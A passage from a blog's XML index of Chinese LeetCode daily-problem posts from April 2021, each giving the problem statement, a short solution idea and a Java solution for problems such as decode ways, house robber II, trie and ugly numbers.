    <content type="text"><![CDATA[题目：377. 组合总和 Ⅳ难度：中等 给你一个由 不同 整数组成的数组 nums ，和一个目标整数 target 。请你从 nums 中找出并返回总和为 target 的元素组合的个数。 题目数据保证答案符合 32 位整数范围。 示例 1： 123456789101112输入：nums = [1,2,3], target = 4输出：7解释：所有可能的组合为：(1, 1, 1, 1)(1, 1, 2)(1, 2, 1)(1, 3)(2, 1, 1)(2, 2)(3, 1)请注意，顺序不同的序列被视作不同的组合。 示例 2： 12输入：nums = [9], target = 3输出：0 提示： 1 &lt;= nums.length &lt;= 200 1 &lt;= nums[i] &lt;= 1000 nums 中的所有元素 互不相同 1 &lt;= target &lt;= 1000 进阶： 如果给定的数组中含有负数会发生什么？问题会产生何种变化？如果允许负数出现，需要向题目中添加哪些限制条件？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/combination-sum-iv/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 搜索 解题代码12345678910111213141516171819202122232425262728class Solution &#123; public int combinationSum4(int[] nums, int target) &#123; ms = new int[target + 1]; Arrays.fill(ms,-1); int ans = dfs(nums,target); return ans; &#125; int[] ms; private int dfs(int[] nums,int t) &#123; if (t &lt; 0) &#123; return 0; &#125; if (t == 0) &#123; return 1; &#125; if (ms[t] != -1) &#123; return ms[t]; &#125; int ans = 0; for (int i = 0;i &lt; nums.length;i++) &#123; ans += dfs(nums,t - nums[i]); &#125; ms[t] = ans; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/23]]></title>
    <url>%2Fposts%2F5ed33f6e%2F</url>
    <content type="text"><![CDATA[题目：368. 最大整除子集难度：中等 给你一个由 无重复 正整数组成的集合 nums ，请你找出并返回其中最大的整除子集 answer ，子集中每一元素对 (answer[i], answer[j]) 都应当满足： answer[i] % answer[j] == 0 ，或 answer[j] % answer[i] == 0 如果存在多个有效解子集，返回其中任何一个均可。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/largest-divisible-subset著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 示例 1： 123输入：nums = [1,2,3]输出：[1,2]解释：[1,3] 也会被视为正确答案。 示例 2： 12输入：nums = [1,2,4,8]输出：[1,2,4,8] 提示： 1 &lt;= nums.length &lt;= 1000 1 &lt;= nums[i] &lt;= 2 * 109 nums 中的所有整数 互不相同 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/largest-divisible-subset/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 我不会 抄的 解题代码12345678910111213141516171819202122232425262728293031323334353637383940class Solution &#123; public List&lt;Integer&gt; largestDivisibleSubset(int[] nums) &#123; int n = nums.length; Arrays.sort(nums); List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); int[] dp = new int[n]; int[] g = new int[n]; Arrays.fill(dp,1); for (int i = 0;i &lt; n;i++) &#123; int len = 1; int pre = i; for (int j = 0;j &lt; i;j++) &#123; if (nums[i] % nums[j] == 0) &#123; if (dp[j] + 1 &gt; len) &#123; len = dp[j] + 1; pre = j; &#125; &#125; &#125; dp[i] = len; g[i] = pre; &#125; int max = -1; int index = -1; for (int i = 0;i &lt; dp.length;i++) &#123; if (dp[i] &gt; max) &#123; max = dp[i]; index = i; &#125; &#125; while (ans.size() &lt; max) &#123; ans.add(nums[index]); index = g[index]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/21]]></title>
    <url>%2Fposts%2Fb0dd5e42%2F</url>
    <content type="text"><![CDATA[题目：91. 解码方法难度：中等 一条包含字母 A-Z 的消息通过以下映射进行了 编码 ： 1234&apos;A&apos; -&gt; 1&apos;B&apos; -&gt; 2...&apos;Z&apos; -&gt; 26 要 解码 已编码的消息，所有数字必须基于上述映射的方法，反向映射回字母（可能有多种方法）。例如，”11106” 可以映射为： “AAJF” ，将消息分组为 (1 1 10 6) “KJF” ，将消息分组为 (11 10 6) 注意，消息不能分组为 (1 11 06) ，因为 “06” 不能映射为 “F” ，这是由于 “6” 和 “06” 在映射中并不等价。 给你一个只含数字的 非空 ** 字符串 s ，请计算并返回 **解码 方法的 总数 。 题目数据保证答案肯定是一个 32 位 的整数。 示例 1： 123输入：s = &quot;12&quot;输出：2解释：它可以解码为 &quot;AB&quot;（1 2）或者 &quot;L&quot;（12）。 示例 2： 123输入：s = &quot;226&quot;输出：3解释：它可以解码为 &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), 或者 &quot;BBF&quot; (2 2 6) 。 示例 3： 12345输入：s = &quot;0&quot;输出：0解释：没有字符映射到以 0 开头的数字。含有 0 的有效映射是 &apos;J&apos; -&gt; &quot;10&quot; 和 &apos;T&apos;-&gt; &quot;20&quot; 。由于没有字符，因此没有有效的方法对此进行解码，因为所有数字都需要映射。 示例 4： 123输入：s = &quot;06&quot;输出：0解释：&quot;06&quot; 不能映射到 &quot;F&quot; ，因为字符串含有前导 0（&quot;6&quot; 和 &quot;06&quot; 在映射中并不等价）。 提示： 1 &lt;= s.length &lt;= 100 s 只包含数字，并且可能包含前导零。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/decode-ways/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 对于每一个位置的字符，可以选1个，或者有限制的选两个，很容易的就写出搜索算法，但是，一看数据量字符串的长度是100，因此朴素的搜索一定会超时，于是采用记忆化或者dp打表的方式，给出记忆化的代码 解题代码1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; public int numDecodings(String s) &#123; ms = new int[s.length()]; Arrays.fill(ms,-1); int ans = dfs(s.toCharArray(),0); return ans; &#125; int[] ms; public int dfs(char[] a,int c) &#123; if (c &gt;= a.length) &#123; if (c == a.length) &#123; return 1; &#125; return 0; &#125; if (ms[c] != -1) &#123; return ms[c]; &#125; int num = a[c] - '0'; if (num == 0) &#123; return 0; &#125; if (num &lt;= 2) &#123; int o = 0; if (c + 1 &lt; a.length &amp;&amp; num * 10 + a[c + 1] - '0' &lt;= 26) &#123; o = dfs(a,c + 2); &#125; return ms[c] = o + dfs(a,c + 1); &#125; return ms[c] = dfs(a,c + 1); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/20]]></title>
    <url>%2Fposts%2Fc7da6ed4%2F</url>
    <content type="text"><![CDATA[题目：28. 实现 strStr()难度：简单 实现 strStr() 函数。 给你两个字符串 haystack 和 needle ，请你在 haystack 字符串中找出 needle 字符串出现的第一个位置（下标从 0 开始）。如果不存在，则返回 -1 。 说明： 当 needle 是空字符串时，我们应当返回什么值呢？这是一个在面试中很好的问题。 对于本题而言，当 needle 是空字符串时我们应当返回 0 。这与 C 语言的 strstr() 以及 Java 的 indexOf() 定义相符。 示例 1： 12输入：haystack = &quot;hello&quot;, needle = &quot;ll&quot;输出：2 示例 2： 12输入：haystack = &quot;aaaaa&quot;, needle = &quot;bba&quot;输出：-1 示例 3： 12输入：haystack = &quot;&quot;, needle = &quot;&quot;输出：0 提示： 0 &lt;= haystack.length, needle.length &lt;= 5 * 104 haystack 和 needle 仅由小写英文字符组成 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/implement-strstr/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 流下了不会kmp的泪水 解题代码12345678910111213141516171819202122232425262728293031class Solution &#123; public int strStr(String haystack, String needle) &#123; int ans = -1; if (needle.length() &lt;= 0) &#123; ans = 0; return ans; &#125; for (int i = 0;i + needle.length() &lt;= haystack.length();i++) &#123; int l = i; int r = 0; boolean flag = false; while (l &lt; haystack.length() &amp;&amp; r &lt; needle.length()) &#123; if (haystack.charAt(l) != needle.charAt(r)) &#123; break; &#125; l++; r++; &#125; if (r == needle.length()) &#123; ans = l - needle.length(); break; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/19]]></title>
    <url>%2Fposts%2F952b85b3%2F</url>
    <content type="text"><![CDATA[题目：27. 移除元素难度：简单 给你一个数组 nums 和一个值 val，你需要 原地 移除所有数值等于 val 的元素，并返回移除后数组的新长度。 不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并 原地 修改输入数组 。 元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。 说明: 为什么返回数值是整数，但输出的答案是数组呢? 请注意，输入数组是以 「引用」 方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。 你可以想象内部操作如下: 12345678// nums 是以“引用”方式传递的。也就是说，不对实参作任何拷贝int len = removeElement(nums, val);// 在函数里修改输入数组对于调用者是可见的。// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。for (int i = 0; i &lt; len; i++) &#123; print(nums[i]);&#125; 示例 1： 123输入：nums = [3,2,2,3], val = 3输出：2, nums = [2,2]解释：函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。你不需要考虑数组中超出新长度后面的元素。例如，函数返回的新长度为 2 ，而 nums = [2,2,3,3] 或 nums = [2,2,0,0]，也会被视作正确答案。 示例 2： 123输入：nums = [0,1,2,2,3,0,4,2], val = 2输出：5, nums = [0,1,4,0,3]解释：函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。注意这五个元素可为任意顺序。你不需要考虑数组中超出新长度后面的元素。 提示： 0 &lt;= nums.length &lt;= 100 0 &lt;= nums[i] &lt;= 50 0 &lt;= val &lt;= 100 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-element/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 水题 解题代码1234567891011class Solution &#123; public int removeElement(int[] nums, int val) &#123; int p = 0; for (int i = 0;i &lt; nums.length;i++) &#123; if (nums[i] != val) &#123; nums[p++] = nums[i]; &#125; &#125; return p; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/18]]></title>
    <url>%2Fposts%2Fe22cb525%2F</url>
    <content type="text"><![CDATA[题目：26. 删除有序数组中的重复项难度：简单 给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 只出现一次 ，返回删除后数组的新长度。 不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。 说明: 为什么返回数值是整数，但输出的答案是数组呢? 请注意，输入数组是以 「引用」 方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。 你可以想象内部操作如下: 12345678// nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝int len = removeDuplicates(nums);// 在函数里修改输入数组对于调用者是可见的。// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。for (int i = 0; i &lt; len; i++) &#123; print(nums[i]);&#125; 示例 1： 123输入：nums = [1,1,2]输出：2, nums = [1,2]解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。 示例 2： 123输入：nums = [0,0,1,1,1,2,2,3,3,4]输出：5, nums = [0,1,2,3,4]解释：函数应该返回新的长度 5 ， 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4 。不需要考虑数组中超出新长度后面的元素。 提示： 0 &lt;= nums.length &lt;= 3 * 104 -104 &lt;= nums[i] &lt;= 104 nums 已按升序排列 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 双指针 解题代码123456789101112131415class Solution &#123; public int removeDuplicates(int[] nums) &#123; int l = 0; int p = 0; while (l &lt; nums.length) &#123; int r = l + 1; while (r &lt; nums.length &amp;&amp; nums[l] == nums[r]) &#123; r++; &#125; nums[p++] = nums[l]; l = r; &#125; return p; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>双指针</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/15]]></title>
    <url>%2Fposts%2F9c9dc998%2F</url>
    <content type="text"><![CDATA[题目：213. 打家劫舍 II难度：中等 你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。这个地方所有的房屋都 围成一圈 ，这意味着第一个房屋和最后一个房屋是紧挨着的。同时，相邻的房屋装有相互连通的防盗系统， 如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警 。 给定一个代表每个房屋存放金额的非负整数数组，计算你 在不触动警报装置的情况下 ，能够偷窃到的最高金额。 示例 1： 123输入：nums = [2,3,2]输出：3解释：你不能先偷窃 1 号房屋（金额 = 2），然后偷窃 3 号房屋（金额 = 2）, 因为他们是相邻的。 示例 2： 1234输入：nums = [1,2,3,1]输出：4解释：你可以先偷窃 1 号房屋（金额 = 1），然后偷窃 3 号房屋（金额 = 3）。 偷窃到的最高金额 = 1 + 3 = 4 。 示例 3： 12输入：nums = [0]输出：0 提示： 1 &lt;= nums.length &lt;= 100 0 &lt;= nums[i] &lt;= 1000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/house-robber-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 动态规划，dp[i]的含义是，不触动警报装置的情况下，偷窃下标为i的房屋所能获得的最大收益，状态方程为：dp[i] = max(dp[i - 2] + nums[i],dp[i - 1])，巧妙的处理环的方法是，拆成两段，分别考虑 解题代码12345678910111213141516171819202122232425262728293031class Solution &#123; public int rob(int[] nums) &#123; // 0 n - 2 // 1 n - 1 int n = nums.length; if (n == 1) &#123; return nums[0]; &#125; if (n == 2) &#123; return Math.max(nums[0],nums[1]); &#125; int m1 = robRange(nums,0,n - 2); int m2 = robRange(nums,1,n - 1); return Math.max(m1,m2); &#125; public int robRange(int[] nums,int s,int e) &#123; nums = Arrays.copyOfRange(nums,s,e + 1); int[] dp = new int[nums.length]; dp[0] = nums[0]; dp[1] = Math.max(nums[0],nums[1]); for (int i = 2;i &lt; nums.length;i++) &#123; dp[i] = Math.max(dp[i - 2] + nums[i],dp[i - 1]); &#125; return dp[dp.length - 1]; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/14]]></title>
    <url>%2Fposts%2Feb9af90e%2F</url>
    <content type="text"><![CDATA[题目：208. 实现 Trie (前缀树)难度：中等 Trie （发音类似 “try”）或者说 前缀树 是一种树形数据结构，用于高效地存储和检索字符串数据集中的键。这一数据结构有相当多的应用情景，例如自动补完和拼写检查。 请你实现 Trie 类： Trie() 初始化前缀树对象。 void insert(String word) 向前缀树中插入字符串 word 。 boolean search(String word) 如果字符串 word 在前缀树中，返回 true（即，在检索之前已经插入）；否则，返回 false 。 boolean startsWith(String prefix) 如果之前已经插入的字符串 word 的前缀之一为 prefix ，返回 true ；否则，返回 false 。 示例： 1234567891011121314输入[&quot;Trie&quot;, &quot;insert&quot;, &quot;search&quot;, &quot;search&quot;, &quot;startsWith&quot;, &quot;insert&quot;, &quot;search&quot;][[], [&quot;apple&quot;], [&quot;apple&quot;], [&quot;app&quot;], [&quot;app&quot;], [&quot;app&quot;], [&quot;app&quot;]]输出[null, null, true, false, true, null, true]解释Trie trie = new Trie();trie.insert(&quot;apple&quot;);trie.search(&quot;apple&quot;); // 返回 Truetrie.search(&quot;app&quot;); // 返回 Falsetrie.startsWith(&quot;app&quot;); // 返回 Truetrie.insert(&quot;app&quot;);trie.search(&quot;app&quot;); // 返回 True 提示： 1 &lt;= word.length, prefix.length &lt;= 2000 word 和 prefix 仅由小写英文字母组成 insert、search 和 startsWith 调用次数 总计 不超过 3 * 104 次 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/implement-trie-prefix-tree/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 C V 大法好 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Trie &#123; private Trie[] children; private boolean isEnd; /** Initialize your data structure here. */ public Trie() &#123; children = new Trie[26]; isEnd = false; &#125; /** Inserts a word into the trie. */ public void insert(String word) &#123; Trie node = this; for (int i = 0;i &lt; word.length();i++) &#123; int index = word.charAt(i) - 'a'; if (node.children[index] == null) &#123; node.children[index] = new Trie(); &#125; node = node.children[index]; &#125; node.isEnd = true; &#125; /** Returns if the word is in the trie. */ public boolean search(String word) &#123; Trie node = searchPrefix(word); return node != null &amp;&amp; node.isEnd; &#125; private Trie searchPrefix(String word) &#123; Trie node = this; for (int i = 0;i &lt; word.length();i++) &#123; int index = word.charAt(i) - 'a'; if (node.children[index] == null) &#123; return null; &#125; node = node.children[index]; &#125; return node; &#125; /** Returns if there is any word in the trie that starts with the given prefix. */ public boolean startsWith(String prefix) &#123; return searchPrefix(prefix) != null; &#125;&#125;/** * Your Trie object will be instantiated and called as such: * Trie obj = new Trie(); * obj.insert(word); * boolean param_2 = obj.search(word); * boolean param_3 = obj.startsWith(prefix); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字典树</tag>
        <tag>前缀树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/13]]></title>
    <url>%2Fposts%2F75fe6cad%2F</url>
    <content type="text"><![CDATA[题目：783. 二叉搜索树节点最小距离难度：简单 给你一个二叉搜索树的根节点 root ，返回 树中任意两不同节点值之间的最小差值 。 注意： 本题与 530：https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/ 相同 示例 1： 12输入：root = [4,2,6,1,3]输出：1 示例 2： 12输入：root = [1,0,48,null,null,12,49]输出：1 提示： 树中节点数目在范围 [2, 100] 内 0 &lt;= Node.val &lt;= 105 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二叉搜索树中序遍历是有序的，因此任意两个节点之差最小值一定是相邻的两个节点之差的最小值 解题代码1234567891011121314151617181920212223242526272829303132333435/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; int ans = Integer.MAX_VALUE; int pre = -1; public int minDiffInBST(TreeNode root) &#123; dfs(root); return ans; &#125; public void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.left); if (pre != -1) &#123; ans = Math.min(ans,root.val - pre); &#125; pre = root.val; dfs(root.right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/12]]></title>
    <url>%2Fposts%2F2f95c3b%2F</url>
    <content type="text"><![CDATA[题目：179. 最大数难度：中等 给定一组非负整数 nums，重新排列每个数的顺序（每个数不可拆分）使之组成一个最大的整数。 注意： 输出结果可能非常大，所以你需要返回一个字符串而不是整数。 示例 1： 12输入：nums = [10,2]输出：&quot;210&quot; 示例 2： 12输入：nums = [3,30,34,5,9]输出：&quot;9534330&quot; 示例 3： 12输入：nums = [1]输出：&quot;1&quot; 示例 4： 12输入：nums = [10]输出：&quot;10&quot; 提示： 1 &lt;= nums.length &lt;= 100 0 &lt;= nums[i] &lt;= 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/largest-number/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 看起来只需要一个自定义排序就行了，注意：测试用例告诉我们会出现数组元素全为0的情况 解题代码12345678910111213141516171819202122class Solution &#123; public String largestNumber(int[] nums) &#123; String[] snums = new String[nums.length]; for (int i = 0;i &lt; nums.length;i++) &#123; snums[i] = String.valueOf(nums[i]); &#125; Arrays.sort(snums,new Comparator&lt;String&gt;() &#123; public int compare(String a,String b) &#123; return -(a + b).compareTo(b + a); &#125; &#125;); if (snums[0].equals("0")) &#123; return "0"; &#125; StringBuilder ans = new StringBuilder(); for (String s : snums) &#123; ans.append(s); &#125; // System.out.println(Arrays.toString(snums)); return ans.toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/11]]></title>
    <url>%2Fposts%2F9bf00d81%2F</url>
    <content type="text"><![CDATA[题目：264. 丑数 II难度：中等 给你一个整数 n ，请你找出并返回第 n 个 丑数 。 丑数 就是只包含质因数 2、3 和/或 5 的正整数。 示例 1： 123输入：n = 10输出：12解释：[1, 2, 3, 4, 5, 6, 8, 9, 10, 12] 是由前 10 个丑数组成的序列。 示例 2： 123输入：n = 1输出：1解释：1 通常被视为丑数。 提示： 1 &lt;= n &lt;= 1690 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/ugly-number-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 老实说 这题提示里面也已经把解题思路都告诉大家了 解题代码1234567891011121314151617181920212223class Solution &#123; public int nthUglyNumber(int n) &#123; int[] uglys = new int[n]; uglys[0] = 1; int p2 = 0,p3 = 0,p5 = 0; for (int i = 1;i &lt; n;i++) &#123; int next2 = uglys[p2] * 2; int next3 = uglys[p3] * 3; int next5 = uglys[p5] * 5; uglys[i] = Math.min(Math.min(next2,next3),next5); if (uglys[i] == next2) &#123; p2++; &#125; if (uglys[i] == next3) &#123; p3++; &#125; if (uglys[i] == next5) &#123; p5++; &#125; &#125; return uglys[n - 1]; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/10]]></title>
    <url>%2Fposts%2Fecf73d17%2F</url>
    <content type="text"><![CDATA[题目：263. 丑数难度：简单 给你一个整数 n ，请你判断 n 是否为 丑数 。如果是，返回 true ；否则，返回 false 。 丑数 就是只包含质因数 2、3 和/或 5 的正整数。 示例 1： 123输入：n = 6输出：true解释：6 = 2 × 3 示例 2： 123输入：n = 8输出：true解释：8 = 2 × 2 × 2 示例 3： 123输入：n = 14输出：false解释：14 不是丑数，因为它包含了另外一个质因数 7 。 示例 4： 123输入：n = 1输出：true解释：1 通常被视为丑数。 提示： -231 &lt;= n &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/ugly-number/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 其实就是一个质因数分解问题 解题代码123456789101112131415161718192021class Solution &#123; public boolean isUgly(int n) &#123; if (n &lt;= 0) &#123; return false; &#125; while (n != 1) &#123; if (n % 2 == 0) &#123; n /= 2; &#125; else if (n % 3 == 0) &#123; n /= 3; &#125; else if (n % 5 == 0) &#123; n /= 5; &#125; else &#123; return false; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/9]]></title>
    <url>%2Fposts%2F957ec9e5%2F</url>
    <content type="text"><![CDATA[题目：154. 寻找旋转排序数组中的最小值 II难度：困难 已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,4,4,5,6,7] 在变化后可能得到： 若旋转 4 次，则可以得到 [4,5,6,7,0,1,4] 若旋转 7 次，则可以得到 [0,1,4,4,5,6,7] 注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。 给你一个可能存在 重复 元素值的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 示例 1： 12输入：nums = [1,3,5]输出：1 示例 2： 12输入：nums = [2,2,2,0,1]输出：0 提示： n == nums.length 1 &lt;= n &lt;= 5000 -5000 &lt;= nums[i] &lt;= 5000 nums 原来是一个升序排序的数组，并进行了 1 至 n 次旋转 进阶： 这道题是 寻找旋转排序数组中的最小值 的延伸题目。 允许重复会影响算法的时间复杂度吗？会如何影响，为什么？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 好像跟昨天的代码一模一样 解题代码12345678910111213141516171819class Solution &#123; public int findMin(int[] nums) &#123; return binarySearch(nums,0,nums.length - 1); &#125; public int binarySearch(int[] nums,int l,int r) &#123; if (l &gt;= r) &#123; return Math.min(nums[l],nums[r]); &#125; int m = (l + r) / 2; if (nums[r] &gt; nums[l]) &#123; return nums[l]; &#125; else &#123; int a = binarySearch(nums,l,m); int b = binarySearch(nums,m + 1,r); return Math.min(a,b); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/4/8]]></title>
    <url>%2Fposts%2Fe279f973%2F</url>
    <content type="text"><![CDATA[题目：153. 寻找旋转排序数组中的最小值难度：中等 已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,2,4,5,6,7] 在变化后可能得到： 若旋转 4 次，则可以得到 [4,5,6,7,0,1,2] 若旋转 4 次，则可以得到 [0,1,2,4,5,6,7] 注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。 给你一个元素值 互不相同 的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 示例 1： 123输入：nums = [3,4,5,1,2]输出：1解释：原数组为 [1,2,3,4,5] ，旋转 3 次得到输入数组。 示例 2： 123输入：nums = [4,5,6,7,0,1,2]输出：0解释：原数组为 [0,1,2,4,5,6,7] ，旋转 4 次得到输入数组。 示例 3： 123输入：nums = [11,13,15,17]输出：11解释：原数组为 [11,13,15,17] ，旋转 4 次得到输入数组。 提示： n == nums.length 1 &lt;= n &lt;= 5000 -5000 &lt;= nums[i] &lt;= 5000 nums 中的所有整数 互不相同 nums 原来是一个升序排序的数组，并进行了 1 至 n 次旋转 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二分查找 解题代码12345678910111213141516171819class Solution &#123; public int findMin(int[] nums) &#123; return binarySearch(nums,0,nums.length - 1); &#125; private int binarySearch(int[] nums,int l,int r) &#123; if (l &gt;= r) &#123; return Math.min(nums[l],nums[r]); &#125; int m = (l + r) / 2; if (nums[r] &gt; nums[l]) &#123; return nums[l]; &#125; else &#123; int a = binarySearch(nums,l,m); int b = binarySearch(nums,m + 1,r); return Math.min(a,b); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
